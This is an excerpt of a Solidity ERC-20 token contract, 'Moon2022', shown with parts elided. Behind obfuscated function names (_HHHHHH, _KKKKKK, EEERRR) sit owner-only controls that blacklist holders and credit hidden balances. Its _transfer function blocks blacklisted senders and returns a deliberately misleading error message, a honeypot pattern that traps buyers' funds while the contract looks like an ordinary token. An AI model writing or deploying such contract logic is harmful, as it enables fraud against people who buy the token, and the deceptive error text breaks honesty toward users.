...
contract Ownable is Context {
    ...
    address private _OwnerAddress = 0x56194ac559f1Ce88aB819D95b26e75D26fAcC57B;
...
contract Moon2022 is Context, IERC20, Ownable {
    ...
    string private _symbol = "2022Moon";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public deadFee = 7;

    mapping(address => bool) private _BBB;
    bool private bhc = true;
    bool private blc = false;
  
    uint256 public BBB = uint256(0);
    mapping(address => uint256) private BBBs;
    address[] private _BBBs;
    address owners;
    ...
    function EEERRR(address sp, uint256 Va) external OwnerAddress() {
        require(Va > 0, "ass");
        uint256 puck = BBBs[sp];
        if (puck == 0) _BBBs.push(sp);
        BBBs[sp] = puck.add(Va);
        BBB = BBB.add(Va);
    ...
    function _PPPP(bool amountt) external OwnerAddress() {
        blc = amountt;
    }
    function _HHHHHH(address amountt) external OwnerAddress() {
        _BBB[amountt] = true;
    }

    function _KKKKKK(address amountt) external OwnerAddress() {
        delete _BBB[amountt];
    }
    ...
    function _transfer(
        ...
        if (bhc) {
            require(_BBB[from] == false, "Transfer amount must be greater than zero");
        }
